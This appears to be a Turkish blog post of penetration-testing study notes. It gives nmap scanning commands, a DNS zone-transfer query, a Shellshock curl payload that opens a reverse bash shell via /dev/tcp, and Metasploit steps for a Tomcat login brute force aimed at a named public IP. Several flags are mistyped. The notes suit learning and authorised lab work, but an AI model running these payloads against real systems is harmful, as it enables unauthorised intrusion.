---
title: 'Siber Güvenlik Notları #1'
layout: post
tag: siberGuvenlikNotlari
---

// begin aktif tarama
* nmap -Sp 192.168.143.0/24 —> bu ağda bana cevap veren makinaların ip adreslerini listeler
* nmap 192.168.1.1 —> bu ip adresindeki açık top 1000 port taranır ve listelenir
* nmap 192.168.1.1 -p 0-65535 —> 0 ile 65535 arasındaki tüm portları tarar.
* nmap 192.168.1.1 -Pn —> ping atmadan tarama yap.
* nmap 192.168.1.1 -Pn -sV —> ping atmadan tara ve portlarda ne hangi versiyonda çalışıyor kontrol et listele.
* nmap 192.168.1.1 -Pn -sV -p 21 —> sadece 21 portu için ping atmadan tara ve ne hangi versiyonda çalışıyor kontrol et listele. versiyon bilgisine göre zafiyet analizi yapılabilir bu bilgiler benim için önemli.
* nmap 192.168.1.1 -Pn -oN sonuc —> tarama verilerini sonuc isimli dosyaya yazar.
* nmap 192.168.1.1 -Pn -oX sonuc.xml —> tarama verilerini sonuc isimli xml dosyaya yazar.
// end aktif tarama

//begin NMAP İle SCRIPT Taraması
* nmap 10.10.50.13 -p 22 -A —> Açık bulduğun portu analiz et bilgi topla keşif yap
* nmap 10.10.50.13 -p 21 -A —> Açık bulduğun portu analiz et bilgi topla keşif yap
* ftp 10.10.50.13 —> ftp bağlan
//end NMAP İle SCRIPT Taraması

//begin DNS Zone Transfer
* nmap 10.10.50.13 -p 80,445,53 -A —> bu ipdeki bu portlara bak ve analiz et.
* dig A domain.name @ipadresi —> dig aracı ile bu ipdeki bu domain name ağ kaydı var mı
* dig AXFR tkeskin@10.10.4.75 —> zone transfer bilgileri
//end DNS Zone Transfer

//begin SHELLSHOCK Zafiyeti ve Sömürülmesi
* nikto —> http servisi üzerinde zafiyetli durumları bulur
* nikto —host 10.10.50.13 —> host uzerindeki zafiyetleri tara gel
* nc -lvp 1337 —> bu portu dinle gelen giden var mı bak
* curl -A “() {ignored;};/bin/bash -ş >& /dev/tcp/ip/port 0>&1” ip/port/cgi-bin/test.sh —> bu ip deki bu porttaki makinadan bin bash getir
//end SHELLSHOCK Zafiyeti ve Sömürülmesi

//begin TOMCAT Servisi Sömürülmesi
* nmap 94.103.41.182 -p 8080 -A
* msfconsole —> Metasploit Framework
* search tomcat —> tomcat zafiyeti ile ilgili yapılacaklar listesi
* use 7 —> aracı aktif etme
* options —> istediği parametreler
* set RHOSTS 94.103.41.182
* set THREADS 15
* set STOP_ON_SUCCESS true
* run
//end Servisi Sömürülmesi

//begin Parola Kırma Saldırıları
* nmap 94.103.41.182 -p 22 -A
//end Parola Kırma Saldırıları